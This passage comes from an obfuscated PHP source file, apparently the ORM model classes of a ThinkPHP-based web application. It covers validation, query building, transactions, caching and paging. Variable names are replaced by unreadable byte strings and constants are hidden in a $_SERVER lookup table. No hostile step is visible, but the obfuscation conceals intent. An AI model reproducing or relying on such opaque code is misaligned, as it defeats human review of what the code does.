$À™Á¨±[10] . $ê¼Áß«Æ); return !0; } if (think_config($À™Á¨±[302])) { Session::remove($©ëÚïÎÊ . $À™Á¨±[10] . $ê¼Áß«Æ); } return !1; } return !0; } public function regex($Â±ëŞí, $İÉ¨ıâø) { $ÒàŒÎ—¦ =& $_SERVER[­á Ş³Ö]; $“ƒÀ±ê¥ = array($ÒàŒÎ—¦[303] => $ÒàŒÎ—¦[304], $ÒàŒÎ—¦[305] => $ÒàŒÎ—¦[306], $ÒàŒÎ—¦[307] => $ÒàŒÎ—¦[308], $ÒàŒÎ—¦[309] => $ÒàŒÎ—¦[310], $ÒàŒÎ—¦[311] => $ÒàŒÎ—¦[312], $ÒàŒÎ—¦[313] => $ÒàŒÎ—¦[314], $ÒàŒÎ—¦[315] => $ÒàŒÎ—¦[316], $ÒàŒÎ—¦[290] => $ÒàŒÎ—¦[317], $ÒàŒÎ—¦[318] => $ÒàŒÎ—¦[319]); if (isset($“ƒÀ±ê¥[strtolower($İÉ¨ıâø)])) { $İÉ¨ıâø = $“ƒÀ±ê¥[strtolower($İÉ¨ıâø)]; } return preg_match($İÉ¨ıâø, $Â±ëŞí) === 1; } private function autoOperation(&$Ø½•üØÌ, $Ò…ÊÕÍ) { $¸ÛÅ¨½À =& $_SERVER[­á Ş³Ö]; if (!empty($this->options[$¸ÛÅ¨½À[320]])) { $©°çÆÜã = $this->options[$¸ÛÅ¨½À[320]]; unset($this->options[$¸ÛÅ¨½À[320]]); } elseif (!empty($this->_auto)) { $©°çÆÜã = $this->_auto; } if (isset($©°çÆÜã)) { foreach ($©°çÆÜã as $Øâ®¶ºÍ) { if (empty($Øâ®¶ºÍ[2])) { $Øâ®¶ºÍ[2] = THINK_MODEL_INSERT; } if ($Ò…ÊÕÍ == $Øâ®¶ºÍ[2] || $Øâ®¶ºÍ[2] == THINK_MODEL_BOTH) { switch (trim($Øâ®¶ºÍ[3])) { case $¸ÛÅ¨½À[321]: case $¸ÛÅ¨½À[322]: $ÒâÄ´İ = isset($Øâ®¶ºÍ[4]) ? (array) $Øâ®¶ºÍ[4] : array(); if (isset($Ø½•üØÌ[$Øâ®¶ºÍ[0]])) { array_unshift($ÒâÄ´İ, $Ø½•üØÌ[$Øâ®¶ºÍ[0]]); } if ($¸ÛÅ¨½À[321] == $Øâ®¶ºÍ[3]) { $Ø½•üØÌ[$Øâ®¶ºÍ[0]] = call_user_func_array($Øâ®¶ºÍ[1], $ÒâÄ´İ); } else { $Ø½•üØÌ[$Øâ®¶ºÍ[0]] = call_user_func_array(array(&$this, $Øâ®¶ºÍ[1]), $ÒâÄ´İ); } break; case $¸ÛÅ¨½À[273]: $Ø½•üØÌ[$Øâ®¶ºÍ[0]] = $Ø½•üØÌ[$Øâ®¶ºÍ[1]]; break; case $¸ÛÅ¨½À[323]: if ($¸ÛÅ¨½À[12] === $Ø½•üØÌ[$Øâ®¶ºÍ[0]]) { unset($Ø½•üØÌ[$Øâ®¶ºÍ[0]]); } break; case $¸ÛÅ¨½À[324]: default: $Ø½•üØÌ[$Øâ®¶ºÍ[0]] = $Øâ®¶ºÍ[1]; } if (!1 === $Ø½•üØÌ[$Øâ®¶ºÍ[0]]) { unset($Ø½•üØÌ[$Øâ®¶ºÍ[0]]); } } } } return $Ø½•üØÌ; } protected function autoValidation($ñã…ÖÑã, $²íæÑ•Œ) { $üôŸ¼«® =& $_SERVER[­á Ş³Ö]; if (!empty($this->options[$üôŸ¼«®[325]])) { $äğ²ÖÈó = $this->options[$üôŸ¼«®[325]]; unset($this->options[$üôŸ¼«®[325]]); } elseif (!empty($this->_validate)) { $äğ²ÖÈó = $this->_validate; } if (isset($äğ²ÖÈó)) { if ($this->patchValidate) { $this->error = array(); } foreach ($äğ²ÖÈó as $«úåâè => $ù¸ÚŠ¤ç) { if (empty($ù¸ÚŠ¤ç[5]) || $ù¸ÚŠ¤ç[5] == THINK_MODEL_BOTH || $ù¸ÚŠ¤ç[5] == $²íæÑ•Œ) { if (0 == strpos($ù¸ÚŠ¤ç[2], $üôŸ¼«®[326]) && strpos($ù¸ÚŠ¤ç[2], $üôŸ¼«®[327])) { $ù¸ÚŠ¤ç[2] = think_lang(substr($ù¸ÚŠ¤ç[2], 2, -1)); } $ù¸ÚŠ¤ç[3] = isset($ù¸ÚŠ¤ç[3]) ? $ù¸ÚŠ¤ç[3] : THINK_EXISTS_VALIDATE; $ù¸ÚŠ¤ç[4] = isset($ù¸ÚŠ¤ç[4]) ? $ù¸ÚŠ¤ç[4] : $üôŸ¼«®[328]; switch ($ù¸ÚŠ¤ç[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ñã…ÖÑã, $ù¸ÚŠ¤ç)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($üôŸ¼«®[12] != trim($ñã…ÖÑã[$ù¸ÚŠ¤ç[0]])) { if (!1 === $this->_validationField($ñã…ÖÑã, $ù¸ÚŠ¤ç)) { return !1; } } break; default: if (isset($ñã…ÖÑã[$ù¸ÚŠ¤ç[0]])) { if (!1 === $this->_validationField($ñã…ÖÑã, $ù¸ÚŠ¤ç)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Âæßİˆƒ, $æ¹ÏàÙÔ) { if (!1 === $this->_validationFieldItem($Âæßİˆƒ, $æ¹ÏàÙÔ)) { if ($this->patchValidate) { $this->error[$æ¹ÏàÙÔ[0]] = $æ¹ÏàÙÔ[2]; } else { $this->error = $æ¹ÏàÙÔ[2]; return !1; } } return; } protected function _validationFieldItem($¨ô²¶Ç, $•€ª­ŸÑ) { $ãÂ˜òôï =& $_SERVER[­á Ş³Ö]; switch (strtolower(trim($•€ª­ŸÑ[4]))) { case $ãÂ˜òôï[321]: case $ãÂ˜òôï[322]: $÷²‡€í = isset($•€ª­ŸÑ[6]) ? (array) $•€ª­ŸÑ[6] : array(); if (is_string($•€ª­ŸÑ[0]) && strpos($•€ª­ŸÑ[0], $ãÂ˜òôï[50])) { $•€ª­ŸÑ[0] = explode($ãÂ˜òôï[50], $•€ª­ŸÑ[0]); } if (is_array($•€ª­ŸÑ[0])) { foreach ($•€ª­ŸÑ[0] as $¡ï÷÷øÌ) { $¢ ç¸Š¼[$¡ï÷÷øÌ] = $¨ô²¶Ç[$¡ï÷÷øÌ]; } array_unshift($÷²‡€í, $¢ ç¸Š¼); } else { array_unshift($÷²‡€í, $¨ô²¶Ç[$•€ª­ŸÑ[0]]); } if ($ãÂ˜òôï[321] == $•€ª­ŸÑ[4]) { return call_user_func_array($•€ª­ŸÑ[1], $÷²‡€í); } else { return call_user_func_array(array(&$this, $•€ª­ŸÑ[1]), $÷²‡€í); } case $ãÂ˜òôï[329]: return $¨ô²¶Ç[$•€ª­ŸÑ[0]] == $¨ô²¶Ç[$•€ª­ŸÑ[1]]; case $ãÂ˜òôï[330]: if (is_string($•€ª­ŸÑ[0]) && strpos($•€ª­ŸÑ[0], $ãÂ˜òôï[50])) { $•€ª­ŸÑ[0] = explode($ãÂ˜òôï[50], $•€ª­ŸÑ[0]); } $ŒÅµ£Æü = array(); if (is_array($•€ª­ŸÑ[0])) { foreach ($•€ª­ŸÑ[0] as $¡ï÷÷øÌ) { $ŒÅµ£Æü[$¡ï÷÷øÌ] = $¨ô²¶Ç[$¡ï÷÷øÌ]; } } else { $ŒÅµ£Æü[$•€ª­ŸÑ[0]] = $¨ô²¶Ç[$•€ª­ŸÑ[0]]; } if (!empty($¨ô²¶Ç[$this->getPk()])) { $ŒÅµ£Æü[$this->getPk()] = array($ãÂ˜òôï[331], $¨ô²¶Ç[$this->getPk()]); } if ($this->where($ŒÅµ£Æü)->find()) { return !1; } return !0; default: return $this->check($¨ô²¶Ç[$•€ª­ŸÑ[0]], $•€ª­ŸÑ[1], $•€ª­ŸÑ[4]); } } public function check($ò¶âõŸ, $Â£š›û, $ì¦°ğ™½ = "\162\x65\x67\145\170") { $ó½Šæº =& $_SERVER[­á Ş³Ö]; $ì¦°ğ™½ = strtolower(trim($ì¦°ğ™½)); switch ($ì¦°ğ™½) { case $ó½Šæº[7]: case $ó½Šæº[332]: $‚İ ¾¼Ò = is_array($Â£š›û) ? $Â£š›û : explode($ó½Šæº[50], $Â£š›û); return $ì¦°ğ™½ == $ó½Šæº[7] ? in_array($ò¶âõŸ, $‚İ ¾¼Ò) : !in_array($ò¶âõŸ, $‚İ ¾¼Ò); case $ó½Šæº[333]: case $ó½Šæº[334]: if (is_array($Â£š›û)) { $œÒÅÉğ¼ = $Â£š›û[0]; $ŠÕÓ¹ƒÄ = $Â£š›û[1]; } else { list($œÒÅÉğ¼, $ŠÕÓ¹ƒÄ) = explode($ó½Šæº[50], $Â£š›û); } return $ì¦°ğ™½ == $ó½Šæº[333] ? $ò¶âõŸ >= $œÒÅÉğ¼ && $ò¶âõŸ <= $ŠÕÓ¹ƒÄ : $ò¶âõŸ < $œÒÅÉğ¼ || $ò¶âõŸ > $ŠÕÓ¹ƒÄ; case $ó½Šæº[335]: case $ó½Šæº[336]: return $ì¦°ğ™½ == $ó½Šæº[335] ? $ò¶âõŸ == $Â£š›û : $ò¶âõŸ != $Â£š›û; case $ó½Šæº[337]: $ø¹ŸÁ™ˆ = mb_strlen($ò¶âõŸ, $ó½Šæº[338]); if (strpos($Â£š›û, $ó½Šæº[50])) { list($œÒÅÉğ¼, $ŠÕÓ¹ƒÄ) = explode($ó½Šæº[50], $Â£š›û); return $ø¹ŸÁ™ˆ >= $œÒÅÉğ¼ && $ø¹ŸÁ™ˆ <= $ŠÕÓ¹ƒÄ; } else { return $ø¹ŸÁ™ˆ == $Â£š›û; } case $ó½Šæº[339]: list($ãÔ¨ÙÈ, $™Ğ­‹Ë) = explode($ó½Šæº[50], $Â£š›û); if (!is_numeric($ãÔ¨ÙÈ)) { $ãÔ¨ÙÈ = strtotime($ãÔ¨ÙÈ); } if (!is_numeric($™Ğ­‹Ë)) { $™Ğ­‹Ë = strtotime($™Ğ­‹Ë); } return NOW_TIME >= $ãÔ¨ÙÈ && NOW_TIME <= $™Ğ­‹Ë; case $ó½Šæº[340]: return in_array(get_client_ip(), explode($ó½Šæº[50], $Â£š›û)); case $ó½Šæº[341]: return !in_array(get_client_ip(), explode($ó½Šæº[50], $Â£š›û)); case $ó½Šæº[328]: default: return $this->regex($ò¶âõŸ, $Â£š›û); } } public function query($Òí°­’, $ßŞˆıºî = false) { $™åÅôŞâ =& $_SERVER[­á Ş³Ö]; if (!is_bool($ßŞˆıºî) && !is_array($ßŞˆıºî)) { $ßŞˆıºî = func_get_args(); array_shift($ßŞˆıºî); } $Òí°­’ = str_replace(array($™åÅôŞâ[231], $™åÅôŞâ[342]), $™åÅôŞâ[53], $Òí°­’); $Òí°­’ = $this->parseSql($Òí°­’, $ßŞˆıºî); return $this->db->query($Òí°­’); } public function execute($Û±ş°Œ¸, $»¬¤Ê•Ü = false) { if (!is_bool($»¬¤Ê•Ü) && !is_array($»¬¤Ê•Ü)) { $»¬¤Ê•Ü = func_get_args(); array_shift($»¬¤Ê•Ü); } $Û±ş°Œ¸ = $this->parseSql($Û±ş°Œ¸, $»¬¤Ê•Ü); return $this->db->execute($Û±ş°Œ¸); } protected function parseSql($ÛıéºöŠ, $Øş¿¦Ø…) { $‰œÈû˜É =& $_SERVER[­á Ş³Ö]; if (!0 === $Øş¿¦Ø…) { $ïòö” = $this->_parseOptions(); $ÛıéºöŠ = $this->db->parseSql($ÛıéºöŠ, $ïòö”); } elseif (is_array($Øş¿¦Ø…)) { $Øş¿¦Ø… = array_map(array($this->db, $‰œÈû˜É[343]), $Øş¿¦Ø…); $ÛıéºöŠ = vsprintf($ÛıéºöŠ, $Øş¿¦Ø…); } else { $ÛıéºöŠ = strtr($ÛıéºöŠ, array($‰œÈû˜É[344] => $this->getTableName(), $‰œÈû˜É[345] => think_config($‰œÈû˜É[244]))); } $this->db->setModel($this->name); return $ÛıéºöŠ; } public function db($ÀŸ×Óêœ = '', $ºÄş­•¯ = '', $ïñšÛ‚Ä = array()) { $¨Ó™ıÄû =& $_SERVER[­á Ş³Ö]; if ($¨Ó™ıÄû[12] === $ÀŸ×Óêœ && $this->db) { return $this->db; } static $•ñŞ§ = array(); static $—ô„…ı¼ = array(); if (!isset($—ô„…ı¼[$ÀŸ×Óêœ]) || isset($—ô„…ı¼[$ÀŸ×Óêœ]) && $ºÄş­•¯ && $•ñŞ§[$ÀŸ×Óêœ] != $ºÄş­•¯) { if (!empty($ºÄş­•¯) && is_string($ºÄş­•¯) && !1 === strpos($ºÄş­•¯, $¨Ó™ıÄû[8])) { $ºÄş­•¯ = think_config($ºÄş­•¯); } $ÀŸ×Óêœ = think_guid($ºÄş­•¯); $—ô„…ı¼[$ÀŸ×Óêœ] = Db::getInstance($ºÄş­•¯); } elseif (NULL === $ºÄş­•¯) { $—ô„…ı¼[$ÀŸ×Óêœ]->close(); unset($—ô„…ı¼[$ÀŸ×Óêœ]); return; } if (!empty($ïñšÛ‚Ä)) { if (is_string($ïñšÛ‚Ä)) { parse_str($ïñšÛ‚Ä, $ïñšÛ‚Ä); } foreach ($ïñšÛ‚Ä as $º¥æĞ => $”›É¼¹Î) { $this->setProperty($º¥æĞ, $”›É¼¹Î); } } $•ñŞ§[$ÀŸ×Óêœ] = $ºÄş­•¯; $this->db = $—ô„…ı¼[$ÀŸ×Óêœ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Õº£½ËÌ = get_class($this); if ($Õº£½ËÌ == $_SERVER[­á Ş³Ö][346]) { return $this->name; } $this->name = substr($Õº£½ËÌ, 0, -5); } return $this->name; } public function getTableName() { $û§ĞÕØó =& $_SERVER[­á Ş³Ö]; if (empty($this->trueTableName)) { $Ó÷àÂ“Ñ = !empty($this->tablePrefix) ? $this->tablePrefix : $û§ĞÕØó[12]; if (!empty($this->tableName)) { $Ó÷àÂ“Ñ .= $this->tableName; } else { $Ó÷àÂ“Ñ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ó÷àÂ“Ñ); } return (!empty($this->dbName) ? $this->dbName . $û§ĞÕØó[10] : $û§ĞÕØó[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $„áÂô´ =& $_SERVER[­á Ş³Ö]; return isset($this->fields[$„áÂô´[251]]) ? $this->fields[$„áÂô´[251]] : $this->pk; } public function getDbFields() { $À×ÊÔ¸´ =& $_SERVER[­á Ş³Ö]; if (isset($this->options[$À×ÊÔ¸´[279]])) { $è®õû = $this->db->getFields($this->options[$À×ÊÔ¸´[279]]); return $è®õû ? array_keys($è®õû) : !1; } if ($this->fields) { $è®õû = $this->fields; unset($è®õû[$À×ÊÔ¸´[250]], $è®õû[$À×ÊÔ¸´[251]], $è®õû[$À×ÊÔ¸´[252]], $è®õû[$À×ÊÔ¸´[249]]); return $è®õû; } return !1; } public function data($‘‹¬»ƒö = '') { $Éã¤¹ü’ =& $_SERVER[­á Ş³Ö]; if ($Éã¤¹ü’[12] === $‘‹¬»ƒö && !empty($this->data)) { return $this->data; } if (is_object($‘‹¬»ƒö)) { $‘‹¬»ƒö = get_object_vars($‘‹¬»ƒö); } elseif (is_string($‘‹¬»ƒö)) { parse_str($‘‹¬»ƒö, $‘‹¬»ƒö); } elseif (!is_array($‘‹¬»ƒö)) { think_exception(think_lang($Éã¤¹ü’[271])); } $this->data = $‘‹¬»ƒö; return $this; } public function join($šÜâÄëá) { $ÁÇóÁç¿ =& $_SERVER[­á Ş³Ö]; if (is_array($šÜâÄëá)) { $this->options[$ÁÇóÁç¿[282]] = $šÜâÄëá; } elseif (!empty($šÜâÄëá)) { $this->options[$ÁÇóÁç¿[282]][] = $šÜâÄëá; } return $this; } public function union($ºà¶ç†, $šşàÆŒ‚ = false) { $½­ıëæÏ =& $_SERVER[­á Ş³Ö]; if (empty($ºà¶ç†)) { return $this; } if ($šşàÆŒ‚) { $this->options[$½­ıëæÏ[347]][$½­ıëæÏ[348]] = !0; } if (is_object($ºà¶ç†)) { $ºà¶ç† = get_object_vars($ºà¶ç†); } if (is_string($ºà¶ç†)) { $ú§›¹§ = $ºà¶ç†; } elseif (is_array($ºà¶ç†)) { if (isset($ºà¶ç†[0])) { $this->options[$½­ıëæÏ[347]] = array_merge($this->options[$½­ıëæÏ[347]], $ºà¶ç†); return $this; } else { $ú§›¹§ = $ºà¶ç†; } } else { think_exception(think_lang($½­ıëæÏ[271])); } $this->options[$½­ıëæÏ[347]][] = $ú§›¹§; return $this; } public function cache($ÎÓ½ÒÑ = true, $…¡¡Î = null, $å¬ºùÊ = '') { $¶Ï…Øº =& $_SERVER[­á Ş³Ö]; if (!1 !== $ÎÓ½ÒÑ) { $this->options[$¶Ï…Øº[349]] = array($¶Ï…Øº[94] => $ÎÓ½ÒÑ, $¶Ï…Øº[339] => $…¡¡Î, $¶Ï…Øº[33] => $å¬ºùÊ); } return $this; } public function field($±½ÛĞ±©, $Ê†×Š»ü = false) { $€¸óÉ–‚ =& $_SERVER[­á Ş³Ö]; if (!0 === $±½ÛĞ±©) { $›ı¥î‹¥ = $this->getDbFields(); $±½ÛĞ±© = $›ı¥î‹¥ ? $›ı¥î‹¥ : $€¸óÉ–‚[189]; } elseif ($Ê†×Š»ü) { if (is_string($±½ÛĞ±©)) { $±½ÛĞ±© = explode($€¸óÉ–‚[50], $±½ÛĞ±©); } $›ı¥î‹¥ = $this->getDbFields(); $±½ÛĞ±© = $›ı¥î‹¥ ? array_diff($›ı¥î‹¥, $±½ÛĞ±©) : $±½ÛĞ±©; } $this->options[$€¸óÉ–‚[273]] = $±½ÛĞ±©; return $this; } public function scope($ë•ÏÙ÷ô = '', $–Âı¶Ÿ = NULL) { $é‡Ú™Ö´ =& $_SERVER[­á Ş³Ö]; if ($é‡Ú™Ö´[12] === $ë•ÏÙ÷ô) { if (isset($this->_scope[$é‡Ú™Ö´[37]])) { $”õ–±¤® = $this->_scope[$é‡Ú™Ö´[37]]; } else { return $this; } } elseif (is_string($ë•ÏÙ÷ô)) { $Ş™óû™¥ = explode($é‡Ú™Ö´[50], $ë•ÏÙ÷ô); $”õ–±¤® = array(); foreach ($Ş™óû™¥ as $ú’³‹‚µ) { if (!isset($this->_scope[$ú’³‹‚µ])) { continue; } $”õ–±¤® = array_merge($”õ–±¤®, $this->_scope[$ú’³‹‚µ]); } if (!empty($–Âı¶Ÿ) && is_array($–Âı¶Ÿ)) { $”õ–±¤® = array_merge($”õ–±¤®, $–Âı¶Ÿ); } } elseif (is_array($ë•ÏÙ÷ô)) { $”õ–±¤® = $ë•ÏÙ÷ô; } if (is_array($”õ–±¤®) && !empty($”õ–±¤®)) { $this->options = array_merge($this->options, array_change_key_case($”õ–±¤®)); } return $this; } public function where($æÓ·Ô¢, $¹÷ÂÁ”Ï = null) { $Ò×‹õÉï =& $_SERVER[­á Ş³Ö]; if (!is_null($¹÷ÂÁ”Ï) && is_string($æÓ·Ô¢)) { if (!is_array($¹÷ÂÁ”Ï)) { $¹÷ÂÁ”Ï = func_get_args(); array_shift($¹÷ÂÁ”Ï); } $¹÷ÂÁ”Ï = array_map(array($this->db, $Ò×‹õÉï[343]), $¹÷ÂÁ”Ï); $æÓ·Ô¢ = vsprintf($æÓ·Ô¢, $¹÷ÂÁ”Ï); } elseif (is_object($æÓ·Ô¢)) { $æÓ·Ô¢ = get_object_vars($æÓ·Ô¢); } elseif (is_array($æÓ·Ô¢)) { foreach ($æÓ·Ô¢ as $²ğ×‰âü => $ïñ¼ÍúÓ) { if ((is_numeric($²ğ×‰âü) || !$²ğ×‰âü) && is_string($ïñ¼ÍúÓ)) { if (strpos($ïñ¼ÍúÓ, $Ò×‹õÉï[350]) === 0) { continue; } think_trace($Ò×‹õÉï[351], $Ò×‹õÉï[12], $Ò×‹õÉï[49]); die; } } } if (is_string($æÓ·Ô¢) && $Ò×‹õÉï[12] != $æÓ·Ô¢) { $€³Óó™ª = array(); $€³Óó™ª[$Ò×‹õÉï[352]] = $æÓ·Ô¢; $æÓ·Ô¢ = $€³Óó™ª; } if (isset($this->options[$Ò×‹õÉï[275]])) { $this->options[$Ò×‹õÉï[275]] = array_merge($this->options[$Ò×‹õÉï[275]], $æÓ·Ô¢); } else { $this->options[$Ò×‹õÉï[275]] = $æÓ·Ô¢; } return $this; } public function limit($²©Ï“Šı, $ÕéÛ·€ = null) { $—Ñ¨†µÅ =& $_SERVER[­á Ş³Ö]; $this->options[$—Ñ¨†µÅ[292]] = is_null($ÕéÛ·€) ? $²©Ï“Šı : $²©Ï“Šı . $—Ñ¨†µÅ[50] . $ÕéÛ·€; return $this; } public function page($“ğÛäãĞ, $âËÏÇÌµ = null) { $ùÕŞ¥ó¸ =& $_SERVER[­á Ş³Ö]; $this->options[$ùÕŞ¥ó¸[353]] = is_null($âËÏÇÌµ) ? $“ğÛäãĞ : $“ğÛäãĞ . $ùÕŞ¥ó¸[50] . $âËÏÇÌµ; return $this; } public function comment($ïŸ¢¸Ìƒ) { $this->options[$_SERVER[­á Ş³Ö][354]] = $ïŸ¢¸Ìƒ; return $this; } public function setProperty($³Ú„‚Õ·, $‹¥õ³³’) { if (property_exists($this, $³Ú„‚Õ·)) { $this->{$³Ú„‚Õ·} = $‹¥õ³³’; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\x54\151\155\x65", "\x74\151\155\x65", "\151\156\x73\x65\162\x74\54\165\160\144\x61\x74\x65", "\x66\x75\156\x63\164\151\157\x6e"), array("\143\162\x65\x61\x74\x65\124\x69\x6d\x65", "\x74\151\x6d\145", "\x69\156\x73\145\x72\x74", "\x66\165\156\143\x74\151\157\x6e")); public function setDataAuto($Û¹­Çˆ­) { $this->dataAuto = $Û¹­Çˆ­; } public function __construct($ª®¤ä»æ = '', $¿—®ìöë = '', $£ÇÅš€Ö = '') { parent::__construct($ª®¤ä»æ, $¿—®ìöë, $£ÇÅš€Ö); } protected $tableMeta = array(); protected function _beforeInsert(&$…ØºîÇ, $»Ú±ñ) { $ÓÄ¹—½ =& $_SERVER[­á Ş³Ö]; if (!$this->checkDataAutoHas($ÓÄ¹—½[355])) { return; } $this->dataBeforeFilter($…ØºîÇ, $ÓÄ¹—½[355]); } protected function _beforeUpdate(&$¼•êıô, $Šïº½) { $Ø”¤Ğœû =& $_SERVER[­á Ş³Ö]; if (!$this->checkDataAutoHas($Ø”¤Ğœû[356])) { return; } $this->dataBeforeFilter($¼•êıô, $Ø”¤Ğœû[356]); } protected function _afterSelect(&$ÂŒ‹ú‰À, $ôÂè™¹Œ) { if (!is_array($ÂŒ‹ú‰À)) { return; } if (!$this->checkDataAutoHas($_SERVER[­á Ş³Ö][357])) { return; } foreach ($ÂŒ‹ú‰À as &$Ğàæ®ãÉ) { $this->dataAfterFilter($Ğàæ®ãÉ); } unset($Ğàæ®ãÉ); } protected function _afterFind(&$Éî«Ÿ—É, $œ¥Ô€Òµ) { if (!is_array($Éî«Ÿ—É)) { return; } if (!$this->checkDataAutoHas($_SERVER[­á Ş³Ö][357])) { return; } $this->dataAfterFilter($Éî«Ÿ—É); } public static function textEncode($¹Æ®¢è†) { if (!$¹Æ®¢è†) { return $¹Æ®¢è†; } $ÛüÊÍ”Î = json_encode($¹Æ®¢è†); $ÛüÊÍ”Î = preg_replace_callback($_SERVER[­á Ş³Ö][358], function ($¾ÇéØö¨) { return addslashes($¾ÇéØö¨[0]); }, $ÛüÊÍ”Î); return json_decode($ÛüÊÍ”Î); } public static function textDecode($ºÑÈî¶‹) { $ÂÍ£ì˜ =& $_SERVER[­á Ş³Ö]; $˜€Ãƒ‹Ö = json_encode($ºÑÈî¶‹); $˜€Ãƒ‹Ö = preg_replace_callback($ÂÍ£ì˜[359], function ($–‹•ÎâÂ) { return $_SERVER[­á Ş³Ö][97]; }, $˜€Ãƒ‹Ö); return json_decode($˜€Ãƒ‹Ö); } public function setAutoIncrement($ÎéüıØÑ) { $¡­ÔÀãŒ = array($this->getPk() => $ÎéüıØÑ); $¼Üëã´Ñ = $this->data($¡­ÔÀãŒ)->add(); if ($¼Üëã´Ñ) { $this->delete($¼Üëã´Ñ); } } public function getAutoIncrement() { $Õ˜÷«ò• = $this->getTableName(); $ßíÁ¨ÃÔ = $this->max($this->getPk()); $ªëİ€ğè = $this->query("\163\150\x6f\x77\x20\x74\141\x62\x6c\145\x20\163\x74\141\x74\165\x73\40\x77\x68\145\x72\145\40\116\141\x6d\x65\x3d\x27{$Õ˜÷«ò•}\47"); $”êşñı‘ = $ªëİ€ğè[0][$_SERVER[­á Ş³Ö][360]]; $è•¯¯Èğ = max($ßíÁ¨ÃÔ, $”êşñı‘); return $è•¯¯Èğ; } protected function _callBefore($äÂã÷Õ‹, $ÖÁÆ­ì†) { return $this->cacheCallCheck($äÂã÷Õ‹, $ÖÁÆ­ì†, !1); } protected function _callAfter($±áÔ½ø, $ıâ¢áÛ) { return $this->cacheCallCheck($±áÔ½ø, $ıâ¢áÛ, !0); } protected function cacheFunctionAlias($Ââ­İˆ×) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($×•ùÉ¨á, $¶Î±íşÀ, $ÈŠ¹…ëŒ = false) { $œ–ãê¸ = $this->cacheFunctionAlias($¶Î±íşÀ); if (!$œ–ãê¸) { return; } foreach ($œ–ãê¸ as $›‰™ˆ÷ => $ÜôÕ¯¶Å) { $§éµÈÓ = $ÜôÕ¯¶Å[0]; $¯¨µ¯Ó = explode($_SERVER[­á Ş³Ö][50], $ÜôÕ¯¶Å[1]); if ($×•ùÉ¨á == $›‰™ˆ÷) { return $this->cacheFunctionGet($›‰™ˆ÷, $§éµÈÓ); } if ($ÈŠ¹…ëŒ && in_array($×•ùÉ¨á, $¯¨µ¯Ó)) { $this->cacheFunctionClear($›‰™ˆ÷, $§éµÈÓ); } } } public function cacheFunctionGet($Ş±•…ù, $¯·©Æù­) { $°¶‘Í¾ì = $this->cacheKeyMake($Ş±•…ù, $¯·©Æù­); $¾—ùÛä = Cache::get($°¶‘Í¾ì); if (!is_array($¾—ùÛä)) { $¾—ùÛä = call_user_func_array(array($this, $Ş±•…ù), array($¯·©Æù­, !0)); Cache::set($°¶‘Í¾ì, $¾—ùÛä); } return $¾—ùÛä; } public function cacheFunctionClear($«¾ä¬ß, $Œ¿¢çíÇ) { $ÚÍàœÍ˜ = $Œ¿¢çíÇ; if (!is_array($Œ¿¢çíÇ)) { $ÚÍàœÍ˜ = array($Œ¿¢çíÇ); } foreach ($ÚÍàœÍ˜ as $äÎ¸”Œ”) { $Şã¶‹ËÂ = $this->cacheKeyMake($«¾ä¬ß, $äÎ¸”Œ”); Cache::remove($Şã¶‹ËÂ); } } private function cacheKeyMake($ß¢şæ´, $¾Œƒ ¢³) { $Úß‰” =& $_SERVER[­á Ş³Ö]; return get_class($this) . $Úß‰”[11] . $ß¢şæ´ . $Úß‰”[361] . $¾Œƒ ¢³; } protected function selectPageReset() { $«Ëë—½ =& $_SERVER[­á Ş³Ö]; if (isset($GLOBALS[$«Ëë—½[362]])) { return; } $GLOBALS[$«Ëë—½[362]] = isset($GLOBALS[$«Ëë—½[7]][$«Ëë—½[363]]) ? $GLOBALS[$«Ëë—½[7]][$«Ëë—½[363]] : !1; $GLOBALS[$«Ëë—½[364]] = isset($GLOBALS[$«Ëë—½[7]][$«Ëë—½[353]]) ? $GLOBALS[$«Ëë—½[7]][$«Ëë—½[353]] : !1; $GLOBALS[$«Ëë—½[7]][$«Ëë—½[363]] = !1; $GLOBALS[$«Ëë—½[7]][$«Ëë—½[353]] = !1; } protected function selectPageRestore() { $¶­ÖÕ¹Ë =& $_SERVER[­á Ş³Ö]; if (!isset($GLOBALS[$¶­ÖÕ¹Ë[362]])) { return; } $GLOBALS[$¶­ÖÕ¹Ë[7]][$¶­ÖÕ¹Ë[363]] = $GLOBALS[$¶­ÖÕ¹Ë[362]]; $GLOBALS[$¶­ÖÕ¹Ë[7]][$¶­ÖÕ¹Ë[353]] = $GLOBALS[$¶­ÖÕ¹Ë[364]]; if ($GLOBALS[$¶­ÖÕ¹Ë[7]][$¶­ÖÕ¹Ë[363]] === !1) { unset($GLOBALS[$¶­ÖÕ¹Ë[7]][$¶­ÖÕ¹Ë[363]]); } if ($GLOBALS[$¶­ÖÕ¹Ë[7]][$¶­ÖÕ¹Ë[353]] === !1) { unset($GLOBALS[$¶­ÖÕ¹Ë[7]][$¶­ÖÕ¹Ë[353]]); } unset($GLOBALS[$¶­ÖÕ¹Ë[362]]); unset($GLOBALS[$¶­ÖÕ¹Ë[364]]); } protected function selectPage($­×Ïé¾Ô = 200, $–ÍÆêçö = 1) { $ä×ı¸Áé =& $_SERVER[­á Ş³Ö]; global $in; $„‚×ñÙ = $this->optionsValue(); $¿€‡æŒ = 50000; $­×Ïé¾Ô = isset($in[$ä×ı¸Áé[363]]) && $in[$ä×ı¸Áé[363]] ? $in[$ä×ı¸Áé[363]] : $­×Ïé¾Ô; if ($­×Ïé¾Ô === -1) { $in[$ä×ı¸Áé[363]] = !1; $¿€‡æŒ = 100000000; $­×Ïé¾Ô = $¿€‡æŒ; } $¨‹á„ = $„‚×ñÙ; $¨‹á„[$ä×ı¸Áé[365]] = array(); $­×Ïé¾Ô = intval($­×Ïé¾Ô); $­×Ïé¾Ô = $­×Ïé¾Ô <= 